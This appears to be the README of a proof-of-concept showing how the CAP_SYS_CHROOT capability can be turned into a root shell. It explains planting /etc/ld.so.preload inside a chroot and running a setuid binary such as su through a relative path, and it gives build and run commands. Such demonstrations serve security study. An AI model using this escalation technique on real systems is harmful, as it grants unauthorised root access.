This example shows how the ability to call `chroot(2)` can be used to
gain root priviliges. It works as follows: Inside the new root
`/etc/ld.so.preload` is created with the instruction to load
`/run.so`, which in turn starts a shell. Since the working directory
is not changed by `chroot(2)`, a setuid binary from the original root
can be executed using a relative path, leading to the invocation of a
root shell.

To run the example, build it
```
make
```
allow the binary to make `chroot(2)` calls
```
sudo setcap CAP_SYS_CHROOT=ep build/escalate
```
prepare the chroot
```
./prepare-chroot.sh chroot/ $(which su)
```
and run the binary
```
./build/escalate chroot/ $(which su)
```
